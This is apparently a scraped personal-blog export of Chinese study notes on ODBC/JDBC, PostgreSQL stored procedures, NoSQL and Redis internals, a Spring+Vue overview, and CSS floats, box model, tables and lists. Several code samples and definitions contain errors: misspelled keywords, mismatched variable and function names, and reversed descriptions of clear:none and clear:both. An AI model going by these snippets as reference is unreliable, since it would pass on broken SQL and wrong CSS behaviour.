ODBC技术背景： 在传统应用开发，应用系统通常选用特定的DBMS管理系统； 网络环境下，应用系统通常需要对多种数据库的实现互连和资源共享； 如果从一种DBMS改变到另一种DBMS，就意味着要重写应用程序； 而在同一应用系统中，编制多种能在不同的DBMS上运行的应用程序，显然不是可取的方法。 Microsoft推出了开放式数据库互连（Open DataBase Connectivity，简写为ODBC）技术。 ODBC实现了应用程序对多种不同DBMS的数据库的访问，实现了数据库连接方式的变革。 OBDC简介 ODBC定义了一套基于SQL的、公共的、与数据库无关的API（应用程序设计接口）； 使每个应用程序利用相同的源代码就可访问不同的数据库系统，存取多个数据库中的数据； 从而使得应用程序与数据库管理系统（DBMS）之间在逻辑上的独立性，使应用程序具有数据库无关性。 ODBC层次结构 应用程序使用ODBC访问数据库的步骤①首先必须用ODBC管理器注册一个数据源； ②管理器根据数据源提供的数据库位置、数据库类型及ODBC驱动程序等信息，建立起ODBC与具体数据库的联系； ③应用程序只需将数据源名提供给ODBC，ODBC就能建立起与相应数据库的连接； ④这样，应用程序就可以通过驱动程序管理器与数据库交换信息； ⑤驱动程序管理器负责将应用程序对ODBC API的调用传递给正确的驱动程序； ⑥驱动程序在执行完相应的SQL操作后，将结果通过驱动程序管理器返回给应用程序。 6.1.2 JDBC技术JDBC，是一种用于执行SQL语句的Java API。 它由一组用Java编程语言编写的类和接口组成。这个API由java.sql.*包中的一些类和接口组成，它为数据库开发人员提供了一个标准的API，使他们能够用纯Java API 来编写数据库应用程序。 注意：使用JDBC访问数据库需要相应数据库的JDBC驱动程序。 JDBC工作原理 JDBC访问数据库步骤 驱动程序分类 按标准分： 面向应用程序的API接口 面向驱动程序的API接口 按操作方式分： JDBC-ODBC Bridge Driver Native-API partly-Java Driver JDBC-Net All-Java Driver Native-protocol All-Java Driver JDBC核心类和接口 java.sql.DriverManager JDBC管理类，处理加载和跟踪驱动程序，建立数据库和相应驱动程序之间的连接。 java.sql.Connection 提供的Connection对象代表与数据库的连接。连接过程包括所执行的SQL语句和该连接上所返回的结果。一个应用程序可与单个数据库有一个或多个连接，或者可与多个数据库建立连接。 java.sql.Statement java.PreparedStatement java.sql.CallableStatement java.sql.ResultSet 6.3 存储过程 存储过程（Stored Procedure）是一种数据库的对象； 由一组能完成特定功能的SQL 语句集构成； 是把经常会被重复使用的SQL语句逻辑块封装起来，经编译后，存储在数据库服务器端； 当被再次调用时，而不需要再次编译； 当客户端连接到数据库时，用户通过指定存储过程的名字并给出参数，数据库就可以找到相应的存储过程予以调用。 6.3.1 存储过程基础知识 不同的数据库系统创建存储过程的语法存在差异； 许多数据库为创建存储过程和函数提供不同命令； 如ORACLE、MySQL、SQL SERVER等数据库，使用CREATE PRECEDURE命令创建存储过程，使用CREATE FUNCTION命令创建函数。 PostgreSQL使用CREATE FUNCTION命令创建存储过程。(11版本后可以用CREATE PRECEDURE) 创建存储过程PostgreSQL内置过程控制语言PL/pgSQL中，创建存储过程语法： 12345678910CREATE [ OR REPLACE ] FUNCTION&#x2F;PROCEDURE name ( [ [ argmode ] [ argname ] argtype [ &#123; DEFAULT | &#x3D; &#125; default_expr ] [, ...] ] ) [ RETURNS retype | RETURNS TABLE ( column_name column_type [, ...] ) ]AS $$ &#x2F;&#x2F;$$用于声明存储过程的实际代码的开始DECLARE -- 声明段BEGIN --函数体语句END;$$ LANGUAGE lang_name; &#x2F;&#x2F;$$ 表明代码的结束, LANGUAGE后面指明所用的编程语言 关键字解释： name：要创建的存储过程名； OR REPLACE ：覆盖同名的存储过程； argmode：存储过程参数的模式可以为IN、OUT或INOUT，默认/缺省值是IN。 argname：形式参数的名字。 argtype：返回值的数据类型。 retype：指示RETURNS返回值的数据类型。 RETURNS：返回值；RETURNS TABLE：返回二维表 AS $$：用于声明存储过程的实际代码的开始，当编辑器扫描到下一个$$时，表明代码结束。 DECLARE：PL/pgSQL指示声明存出过程的局部变量。 BEGIN……END：用来定义存储过程的执行体语句。 LANGUAGE：在后面的lang_name指明存储过程是使用PL/pgSQL实现的。 声明局部变量 注释： --单行注释 123* ``` /*多行注释*/ 在块中使用的变量大都必须在声明段中进行声明，但唯一例外的是FOR循环里的循环计数变量，该变量被自动声明为整型。 声明语法 1variable name [CONSTANT] variable_type [NOT NULL] [&#123;DDEFAULT | :&#x3D; &#125; expression]; 注意： SQL数据类型可以作为PL/pgSQL变量的数据类型，如inteser、varchar、char等。例如，声明一个整型变量x，并赋予初始值10： 1x integer : &#x3D;10; 如果给出DEFAULT子句，该变量进入BEGIN块时将被初始化为默认值，否则被初始化为SQL空值。 CONSTANT选项修饰的变量为常量，在被初始化后不允许被重新赋值。 如果变量声明为NOT NULL，那么该变量不允许被赋予空值NULL，否则运行时会抛出异常信息。因此，所有被声明为NOT NULL的变量，必须在声明时赋予非空的默认值。 声明变量为记录类型，变量声明格式为 variable_name record;。记录型变量类似于数据库表的行，但没有预定义的结构，只能通过SELECT或者FOR命令来获取实际的行结构，因此记录变量在被初始化之前无法访问，否则将引发运行时错误。 需要注意的是，reocrd不是确定结构的数据类型，仅仅声明变量可用来存储数据库表的记录。 实例一： 1234567891011CREATE OR REPLACE FUNCTION displaystudents() RETURNS voidAS $BODY$ DECLARE src record; BEGIN for sc in (select distinct(sid),sname from Student) loop raise notice &#39;%-,%-&#39;,sc.sid,sc.name; end loop; END;$BODY$ LANGUAGE plpgsql 实例二： 123456789CREATE OR REPLACE FUNCTION countRecords () RETURNS integer AS $count$ declare count integer; BEGIN SELECT count(*) into count FROM STUDENT; RETURN count; END; $count$ LANGUAGE plpgsql; 调用执行存储过程： 1select totalRecords(); 执行存储过程1234select 存储过程名（参数）；或者： select * from 存储过程名（参数）；例如： select countRecords ( );或者：select * from countRecords ( ); 存储过程的参数名传递给存储过程的参数都可以用$1、$2的标识符来表示。为了增加可读性，可以为参数声明别名，别名和数字标识符均可以指向该参数值。 触发器触发器是存储在数据库中的独立对象，它与存储过程不同，存储过程通过其他程序来启动或直接启动运行，而触发器由一个事件触发启动运行。也就是说，触发器是在某个事件发生时自动地隐式运行，所以启动进行INSERT、UPDATE以及DELETE操作。大多数关系数据库支持触发器，但不同的数据库在触发器的定义和应用方面可能略有不同。 第七章 NoSQL数据库技术（部分了解）NoSQL是Not Only SQL的缩写，是对于不同于传统关系数据库的数据库管理系统的统称。它是一种为解决应用需求而提出的海量数据、非结构化数据处理方法的替补方案，大多数的NoSQL产品基于大内存、高性能随机读/写，这些类型的数据存储不需要固定的模式，不需要多余操作就可以横向扩展。 7.1 NoSQL概述 关系数据库的突出优势： 数据表示的3级模式（外模式、内模式、模式）保证了数据的逻辑独立性与物理独立性，完整的事物处理机制保持了数据的一致性（事物的ACID） 用二维表来表示数据和数据之间的关系，数据更新的开销很小 提供负责连接操作的各种查询处理等 网络和数据库的结合产生了分布式数据库，数据可以分布在网络的不同物理节点上。 数据之间存在着逻辑关系，它们共同完成数据库的全局应用。 互联网很多应用要求大批量数据的写入处理，随时更新的数据模式及其索引、字段不固定、对海量数据的简单查询的快速结果反馈，需要全新的数据库技术来为之提供解决方案mNoSQL应运而生。NoSQL使用新的概念数据模型和物理数据模型，新的数据库体系结构，当然也有新的数据库理论支持。 数据库管理目标与内容 数据类型多样化，数字、字符、文本等，还需要视频、音频、图形、图像、动画、HTML/XML、流数据等更复杂的数据类型 数据结构需要结构化、半结构化、非结构化等各种结构 数据存储方式多样化（列式存储、键值存储、图存储、文档存储等） 存储位置–分布透明， 存储量–海量 查询要求多层次：时空、关联、分析、挖掘等 操作需求多样化：各种数据统计分析、分类、聚类、预测、离群点发现等多种操作或自定义操作 7.1.1 关系数据库的局限关系数据库用二维表的方式来存储数据和数据之间的关系，为OLTP（On Line Transaction Process在线事务处理）提供了数据处理平台 关系数据库以事物为调度单位。 面临的挑战： 数据库高并发读/写需求——大规模事物处理 海量数据的高效存储和处理——各种应用 数据库高扩展性和高可用性需求——云计算 大数据处理方面的需求 大数据的5V特征：超量、高速、异构、真实、价值 海量数据存储的关键技术包括：数据划分、数据一致性和可用性、负载均衡、容错机制、虚拟存储技术、云存储技术。要求数据库必须具有高可扩展性、高并发性、高可用性等特征。 关系数据库的很多主要特性却往往无用武之地：如读一致性、写实时性、读实时性、表的关联查询 7.1.2 NoSQL理论1.CAP理论2.BASE理论3.最终一致性理论7.1.3 NoSQL基本概念1.NoSQL的含义2.NoSQL共同特征3.NoSQL采用的技术每个记录有唯一的键，不支持外键和跨记录关联。 有些NoSQL没有元数据 4.NoSQL数据库分类5.NoSQL整体架构接口层-数据逻辑模型层-数据分布层-数据持久层 7.2 列存储数据库7.2.1 列存储数据库概念列存储索引局限性 列存储索引特点 7.2.2 HBase数据库概念HBase表结构表 行键 列族 列 单元 时间版本 Hbase数据存储类型 HBase数据的存储类型：模式-&gt;表-&gt;列族-&gt;行键-&gt;时间戳-&gt;单元值 HBase特点 7.2.3HBase数据库的存储架构区域是HBase中分布式存储和负载均衡的最小单元。 块是存储管理的最小单元。 表 区域 存储单元：区域由一个或者多个存储单元组成，每个存储单元保存一个列族（每个列族对应一个存储单元）。每个存储单元由一个内存单元和0至多个存储单元组成，每个存储单元保存一个列族。内存单元用于写缓冲，存放临时计算结果。 存储单元文件 7.2.4 HBase数据库的系统架构与组成分布式数据库系统 系统架构主服务器：”心跳“监听，协调者的主服务器选举机制解决了单点问题。 区域服务器：真实存放HBase的地方；切分过大区域；维护区域并处理I/O请求。 协调者服务器：保证任何时候集群中只有一个主服务器，存储所有区域的寻址入口，实时监控服务器状态，主服务器选举机制。 客户端：使用远程过程调用机制与主服务器和区域服务器进行通信。 系统组成日志Hlog BlockCache 内存缓冲单元 7.2.5 HBase数据库的应用场景HBase Shell Java客户端API HBase 非Java存取方式 7.3 键值对数据库KV数据模型是NoSQL中最基本的数据模型 优点/缺点/使用场景 键值对存储分类：临时性（内存）、永久性（硬盘）、两者兼有（硬盘+内存） “分片”技术扩展 7.3.1 键值对存储的概念基于键值对访问 数据模型 数据结构 数据操作 数据完整性 7.3.2 Redis数据库的基本知识1.Redis基本概念整个数据库统统加载在内存中进行操作，定期通过异步方式把内存数据写（Flush）到硬盘上保存。 支持数据类型：字符串、哈希表、链表、链表、集合、有序集合 受物理内存限制，不能用作海量数据的高性能读写，适合场景局限在较小数据量的高性能操作和运算上。 2.Redis数据库的数据类型数据库底层以二进制字节数组的格式存放。 字符串 哈希表：用哈希表内部存储的值为一个哈希映射；哈希表不支持二进制操作命令。 链表：双向链表 集合：通过哈希表实现，增删改查复杂度O(1)，通过计算哈希的方式快速去重。 有序集合：每个元素关联着一个浮点数值，按分值从小到大顺序排列集合元素，成员唯一但浮点数分值可以重复。有序集合内部使用哈希映射和跳跃表来保证数据的存储和有序。 最大值2^32-1 7.3.3 Redis数据库结构1.数据库数组每个Redis服务器的内部数据结构都是RedisDB[]，Redis默认创建16个数据库。 2.数据库的内部结构RedisDB结构中的字典保存了数据库中所有的键值对。 3.字典结构Redis底层实现是字典。 字典也是哈希数据底层实现之一。 字典结构包括：字典、哈希表、哈希表的实体、每个键值对的定义 哈希表大小和哈希表中的节点数比例维持在1：1，哈希表的查询性能才能达到最佳查询性能O(1)。 重新哈希问题：渐进式rehash。 哈希实体记录每个键值定义的指针。 4.对象结构对象信息：数据类型、编码方式、数据指针、虚拟内存。 编码方式：原始表示、整数、哈希表、链表、压缩表，指针用来指向数据在存储的开始位置等。 字符串实现：简单动态字符串：字符串长度、buf用于存储字符串内容、free表示buf中空闲空间长度 哈希表实现：编码ziplist/linedlist，字符串对象是唯一一种会被其他四种类型对象嵌套的对象。 链表实现：编码ziplist/hashtable。 集合实现：ziplist/intset 有序集合实现：ziplist/skiplist。skiplist编码的有序集合对象使用zset结构作为底层实现，一个zset结构同时包含一个字典和一个跳跃表。 对象其他特性：对象空转时长（设置最大内存选项和最后访问时间选项）、内存回收、对象共享 7.3.4 Redis数据库相关操作1.数据库选择用内部数组记录多个数据库的使用，数组中的每个db都是一个数据库，SELECT切换数据库。 2.数据库的键空间字典保存了数据库中的所有键值对，称为键空间。 取键后，服务器更新最近读取时间，用于计算键的闲置时间。键过期则删除；键被修改添加标记。 服务器每次修改一个键后，都会对键计数器值加1，计数器用来触发服务器持久化操作。 3.设置键的生存时间和过期时间经过指定时间之后，服务器会自动删除生存时间为0的键。Redis过期字典记录所有带有过期时间的键，字典的键指向键空间的某个值。 4.过期键删除策略定时删除 惰性删除 定时删除 5.复制功能对过期键的处理RDB复制和AOF复制 6.Redis内存划分数据占用内存、进程运行内存、创建的子进程占用内存、应用系统内存、缓冲内存、客户端缓存、复制积压缓冲、AOF缓存区、内存碎片 安全重启方式减小内存碎片。 7.3.5 Redis数据库的体系结构1.Redis集群哈希槽概念 集群中每个节点平等，都保存了各自的数据和整个集群的状态。每个节点和其他所有节点连接，这些连接保持活跃，保证了只需要连接集群中任意节点，就可以获取其他节点数据。 集群中必须有3个或3个以上节点。当存活节点数小于总结点数的一半，整个集群无法提供服务。 客户端连接到集群中人一个可用节点即可。 2.Redis主从复制主从复制特点：一个主服务器可用有多个从服务器；主服务器可以有从服务器，从服务器也可以有自己的从服务器；支持异步复制和部分复制，主从复制不会阻塞主服务器和从服务器。 3.事物与锁MULTI、EXEC、DISCARD、WATCH 4.持久化机制将内存中的数据周期性地写入磁盘或者把操作追加到记录文件中。 两种方式地持久化：AOF、RDB 5.发布及订阅消息类似于聊天，是一种消息通信模式。发送者将消息发送给频道，频道将消息转发给所有对这个频道感兴趣的订阅者。 7.4 文档数据库用于管理文档，文档是处理数据的基本单位 文档相当于关系数据库中的一条记录，能对包含的数据类型内容进行”自我描述“，XML文档、HTML文档和JSON文档就属于这一类。 文档数据库提供嵌入式文档，可用于需要存储不同的属性及大量数据的应用系统。 7.4.1 文档存储概念7.4.2 MongoDB数据库的基本概念7.4.3 MongoDB的管理7.4.4 MongoDB数据库的集群架构7.4.5 MongDB数据库的应用场景7.5 图形数据库","categories":[],"tags":[{"name":"考试","slug":"考试","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E8%80%83%E8%AF%95/"}]},{"title":"Spring+Vue","slug":"前后端分离","date":"2021-03-22T07:15:23.000Z","updated":"2021-03-29T12:20:50.847Z","comments":true,"path":"2021/03/22/前后端分离/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/03/22/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB/","excerpt":"","text":"前后端分离开发前后端分离就是将一个应用的前端代码和后端代码分开写，提升效率。 前端：客户端代码 后端：独立编写服务端代码，提供数据接口即可。 前端通过Ajax请求来访问后端数据接口，将Model展示到view即可。 前后端开发者只需要提前约定好接口文档（URL、参数、数据类型），然后独立开发即可，前端可以独立造假数据金进行测试即可，完全不需要依赖后端。最后完成前后端集成即可；真正实现前后端的解耦合，极大提升了开发效率。 单体—》前端应用+后端应用 前端应用：负责数据展示和用户交互 后端应用：负责提供数据处理接口 前端HTML—》Ajax接口—》RESTful后端数据接口（JAVA/Spring Boot/…） 传统单体应用 前后端分离应用 前后端分离就是将一个单体应用拆分成两个独立的应用，前端应用和后端应用以JSON格式进行数据交互。 实现技术 Spring+Vue 使用Spring Boot进行后端应用开发，使用Vue进行前端应用开发。","categories":[],"tags":[{"name":"前后端分离/Spring/Vue","slug":"前后端分离-Spring-Vue","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB-Spring-Vue/"}]},{"title":"CSS浮动&盒模型","slug":"前端学习7","date":"2021-03-21T20:03:36.000Z","updated":"2021-05-07T13:30:50.983Z","comments":true,"path":"2021/03/22/前端学习7/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/03/22/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A07/","excerpt":"","text":"第四章 CSS浮动布局&amp;盒模型课程提要 CSS 浮动介绍 CSS清除浮动 CSS盒子模型 CSS table样式 CSS 列表居中 4.1 CSS浮动介绍4.1.1 简介图像、文字都可以浮动，浮动元素会生成一个块级框。 值 效果描述 left 元素向左浮动 right 元素向右浮动 none 默认值，元素不会浮动，并会显示在出现的位置 inherit 按规定应该从父元素继承float属性的值 浮动后不会占用文档 浮动：让块级标签不独占一行，目的是把块级标签排在一行上。 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS浮动&lt;/title&gt; &lt;style&gt; .wrapper&#123; width: 600px; margin: 0 auto; border: 1px solid black; &#125; .box1,.box2&#123; width: 200px; height: 150px; &#125; .box1&#123; background-color: red; float: right; &#125; .box2&#123; background-color: blue; float:left; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;wrapper&quot;&gt; &lt;div class=&quot;box1&quot;&gt;box1&lt;/div&gt; &lt;!--这里的div是块级标签，会独占一行--&gt; &lt;div class=&quot;box2&quot;&gt;box2&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 4.1.2 浮动原理就是让元素脱离文档流，不占用标准流。 4.2 CSS清除浮动问题：浮动后，后面的元素不管是块级元素还是行级元素，都不会显示在下一行。 清除浮动的目的：让后面元素自动掉到下一行。 方法： 添加空标签，并设置样式：clear:both; clear:left：清除左浮动 clear:right 清除右浮动 clear:none 清除左右浮动 clear:both 左右浮动都不清除 在要清除浮动的父级添加样式：主要用于子元素的尺寸超过父元素时，需要预设父元素显示溢出的子元素的方式，可在浮动元素的父级添加 overflow:hidden; overflow:visible：默认值，内容不会被剪裁，会呈现在元素框之外，不剪切也不加滚动条。 overflow:auto：不显示超出部分内容，不剪切，会按照内容是否超出，自动添加，可用作清除浮动。 overflow:hidden：内容会被修剪，并且其余内容不可见，此属性还有清除浮动，清除margin-top塌陷的功能。 overflow:scroll：内容会被修剪，但是浏览器会显示滚动条以便查看其余内容。 使用伪元素after：为了减少空标签的多余，可以采用父级的伪元素进行样式浮动清除。 父元素:after&#123; content:&quot;&quot;; display:block; clear:both; &#125; 123**注意：实际开发中首选第二种方案** &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS浮动&lt;/title&gt; &lt;style&gt; .wrapper&#123; width: 600px; margin: 0 auto; border: 1px solid black; /*overflow: hidden;*/ &#125; .wrapper:after&#123; content:&quot;&quot;; display:block; clear:both; &#125; .box1,.box2,.box3&#123; width: 200px; height: 150px; &#125; .box1&#123; background-color: red; float: right; &#125; .box2&#123; background-color: blue; float:left; &#125; .box3&#123; background-color: #87faf8 ; &#125; .clear&#123; clear:both; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;!--方法一--&gt; &lt;!-- &lt;div class=&quot;wrapper&quot;&gt;--&gt; &lt;!-- &lt;div class=&quot;box1&quot;&gt;box1&lt;/div&gt;&amp;lt;!&amp;ndash;这里的div是块级标签，会独占一行&amp;ndash;&amp;gt;--&gt; &lt;!-- &lt;div class=&quot;box2&quot;&gt;box2&lt;/div&gt;--&gt; &lt;!--&amp;lt;!&amp;ndash; &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;&amp;lt;!&amp;ndash;清除浮动方法一&amp;ndash;&amp;gt;&amp;ndash;&amp;gt;--&gt; &lt;!-- &lt;div class=&quot;box3&quot;&gt;box3&lt;/div&gt;--&gt; &lt;!-- &lt;/div&gt;--&gt; &lt;div class=&quot;wrapper&quot;&gt; &lt;div class=&quot;box1&quot;&gt;box1&lt;/div&gt;&lt;!--这里的div是块级标签，会独占一行--&gt; &lt;div class=&quot;box2&quot;&gt;box2&lt;/div&gt; &lt;/div&gt; &lt;div&gt; &lt;div class=&quot;box3&quot;&gt;box3&lt;/div&gt; &lt;/div&gt; Copy 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051案例：```html&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;案例：浮动布局&lt;/title&gt; &lt;style&gt; .info-show&#123; width: 600px; padding: 20px; border: 1px solid #cccccc; margin:0 auto; overflow: hidden; &#125; .head-sculpture&#123; float:left; text-align: center; &#125; .description&#123; float: left; width:370px; height: 300px; margin-left: 20px; border: 1px solid #ccc; padding:10px 0 0 0;/*上右下左*/ text-align: center; &#125; .photo&#123; width:200px; height: 300px; border: 1px solid #ccc; /*设置垂直居中样式*/ display: table-cell;/*步骤一*/ vertical-align: middle; background-color: #eee; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;info-show&quot;&gt; &lt;div class=&quot;head-sculpture&quot;&gt; &lt;div class=&quot;photo&quot;&gt;头像&lt;/div&gt; &lt;div class=&quot;name&quot;&gt;姓名&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;description&quot;&gt;自我描述&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 4.3 盒子模型每个元素都是一个盒子，一个盒子由外边距margin、边框线border、内边距padding、内容content组成。 区别外边距和内边距是以边框为参照。 系统默认外距为8px* 4.3.1 外边距 外边距（margin）：指元素边框线之外的距离 margin-left：左边距 margin-right：右边距 margin-top：上边距 margin-bottom：下边距 margin可用来设置任意一个边的边距，可以带1~4个参数 一个参数(apx)：表示上下左右都具有这样一个外边距 两个参数(apx,bpx)：上下外边距为apx，左右边距为bpx 三个参数(apx,bpx,cpx):上外边距apx，下外边距cpx，左右边距为bpx 四个参数(apx,bpx,cpx,dpx):顺序为上apx右bpx下cpx左dpx 4.3.2 内边距 内边距(padding)：指的是元素文本内容与边框之间的距离。它的用法与margin完全一致。 padding-left：左边距 padding-right：右边距 padding-top：上边距 padding-bottom：下边距 padding可用来设置任意一个边的边距，可以带1~4个参数 一个参数(apx)：表示上下左右都具有这样一个外边距 两个参数(apx,bpx)：上下外边距为apx，左右边距为bpx 三个参数(apx,bpx,cpx):上外边距apx，下外边距cpx，左右边距为bpx 四个参数(apx,bpx,cpx,dpx):顺序为上apx右bpx下cpx左dpx 4.3.3 边框 边框：就是围绕元素内容和内边距的一条或多条线，设置边距的最简单方法就是使用 1border 属性，允许规定元素边框的样式、宽度和颜色。 none：默认值，无边框 solid：定义实线边框 double：定义双实线边框 dotted：定义点状边框 dashed：定义虚线边框 border-color：定义边框颜色 简写border: width style color，它们没有位置之分 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;css盒子模型&lt;/title&gt; &lt;style&gt; div&#123; width:800px; height: 400px; border: 1px solid red; /*margin: 200px;*/ /*overflow: scroll;*/ &#125; .span&#123; /*display: block;*/ /*将span标签转换为块级标签*/ width:300px; height:300px; /*margin:10px 20px 30px 40px;*/ display: inline-block; margin-right: 20px; padding: 10px 20px 30px 40px; border: 1px dashed black; &#125; .content&#123; height:200px; width: 100px; background-color: #216454; display: inline-block; &#125; .txt&#123; width:100px; height:100px; background-color: #808000; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;span&quot;&gt; &lt;p class=&quot;txt&quot;&gt;&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;content&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 4.3.4 盒子真实尺寸盒子宽度=width+padding左右+border左右 盒子高度=height+padding上下+border上下 4.3.5 display属性用来设置元素显示方式。 常用属性值： none：不显示元素，动态应用。 block：块显示，在元素前后设置换行符，目的：将行级元素转换为块级标签（因为行级标签不识别宽高，而块级标签识别宽高），转换后，行级标签也可以设置宽高 inline：行内显示，将块级标签转换为行级，同时删除换行符。与浮动区别在于不脱离文档流。 inline-block：将块级标签或行级标签转换为行内块级标签。 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;display属性&lt;/title&gt; &lt;style&gt; div&#123; width: 200px; height: 100px; background-color: green; display: inline-block; /*注意：display:inline会导致不显示*/ /*原因：行级标签不识别宽高，要有内容才会显示,高度恒定，width自适应*/ &#125; div:first-child&#123; background-color: yellow; margin-right: -5px; &#125; span&#123; width: 200px; height: 100px; background-color: blue; display: inline-block; margin-left: -5px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;div1&lt;/div&gt; &lt;div&gt;div2&lt;/div&gt; &lt;span&gt;span&lt;/span&gt;&lt;/body&gt;&lt;/html&gt; 4.3.6 table样式table一般不用布局，主要用来格式化数据。 table属性： width：宽度 height：高度 border-collapse：单线边框 border：添加边框线 td\\tr\\th属性： width：宽度 height：高度 border：添加边框线 text-align：文本左右对齐方式（left\\right\\center） vertical-align：文本垂直对齐方式（top/middle（默认值）/bottom） 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;table样式&lt;/title&gt; &lt;style&gt; table,td,th&#123; border: 1px dashed red; /*vertical-align: top;*/ vertical-align: middle; /*设置在行上也是没有问题的*/ &#125; table&#123; border-collapse: collapse;/*生成单线边框*/ margin:0 auto;/*页面实现居中*/ width: 500px; height: 300px; text-align: center;/*表格数据居中*/ &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt; &lt;tr&gt; &lt;th&gt;标题1&lt;/th&gt; &lt;th&gt;标题2&lt;/th&gt; &lt;th&gt;标题3&lt;/th&gt; &lt;th&gt;标题4&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;具体内容1&lt;/td&gt; &lt;td&gt;具体内容2&lt;/td&gt; &lt;td&gt;具体内容3&lt;/td&gt; &lt;td&gt;具体内容4&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;具体内容1&lt;/td&gt; &lt;td&gt;具体内容2&lt;/td&gt; &lt;td&gt;具体内容3&lt;/td&gt; &lt;td&gt;具体内容4&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 4.5 CSS列表水平居中不是描述性的文本的任何内容都可以是列表。比如：菜单、商品列表等。 列表类型：无序(ul)、有序(ol)、用户自定义列表(dl) ul和ol的列表项都是用li表示的，而dl是由一个dt和多个dd组成的。dl一般用来设定一个定义，比如名词解释等。dt：标题，dd：描述，用来对dt的内容进行解释并说明的。 样式（用来修改标识类型） list-style-image:用图像表示标识。 list-style-position:标识的位置（inside/outside默认值） list-style-type:表示类型 简写:list-style:list-style-image list_style-position list-style-type顺序可以随意或者单个省略，只要提供一个值，其他会自动默认 list-style-type的属性值： 有序 decimal(默认) decimal-leading-zero lower-roman upper-romanlower-alpha upper-alpha lower-greek lower-latin upper-latin 无序 disc(默认) square circle 共有 none()，用于去除表示符 123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;列表样式&lt;/title&gt; &lt;style&gt; ul&#123; /*list-style-type: disc;!*默认disc*!*/ list-style-type:circle; list-style-position: inside;/*由outside/和inside两种，outside不会占用文本空间，而inside会*/ /*list-style-image: url(&quot;三国杀.bmp&quot;);!**!*/ &#125; ol&#123; list-style-type: lower-greek; &#125; dt&#123; font-size: 28px; font-weight: bold; &#125; dd&#123; margin-left: 1px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;ol&gt; &lt;li&gt;列表项1&lt;/li&gt; &lt;li&gt;列表项2&lt;/li&gt; &lt;li&gt;列表项3&lt;/li&gt; &lt;li&gt;列表项4&lt;/li&gt;&lt;/ol&gt;&lt;dl&gt; &lt;dt&gt;张加林大笨蛋&lt;/dt&gt; &lt;dd&gt;我是傻逼&lt;/dd&gt; &lt;dd&gt;我是废物&lt;/dd&gt; &lt;dd&gt;我是小丑&lt;/dd&gt;&lt;/dl&gt;&lt;/body&gt;&lt;/html&gt; 4.6 轮播图 作用：主要用于产品展示或者公司相关宣传组成： 轮播的组图（至少两张以上，不能太多） 控制器 计数器 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576/*轮播图*/*&#123; margin: 0; padding: 0;&#125;li&#123; list-style: none ;&#125;a&#123; text-decoration: none;&#125;.carousel&#123; height:412px; width: 581px; margin: 0 auto; background-color: #8080ff; /*position: relative;!*相对定位*!*/ overflow: hidden;&#125;.carousel-imgs img&#123; width:100%; height:412px&#125;.carousel-imgs li&#123; float: left;&#125;.carousel-imgs&#123; width: 9999px;&#125;/*控制器*/.prev&#123; width:45px; height: 40px; position: absolute;/*绝对定位,脱离文档流*/ background-image: url(&quot;../imgs/img.png&quot;); background-size:100%; top:20%;&#125;.next&#123; background-image: url(&quot;../imgs/img_1.png&quot;); position: absolute;/*绝对定位,脱离文档流,相对于position:relative定义的元素进行定位*/ width:45px; height: 45px; background-size:100%; right:190px; top:20%;&#125;/*计数器*/.count&#123; height:10px; position:absolute; width:1000px; bottom:470px;&#125;.count ul&#123; width: 60px; margin: 0; background-color: #111111; height: 10px;&#125;.count ul li&#123; width: 10px; height: 10px; background-color: #87faf8; margin-right: 10px; float: left; border-radius: 50%; opacity: 0.5; cursor: pointer;/*将鼠标形状设置为手形*/&#125;.count ul li.active&#123; background-color: red; opacity: 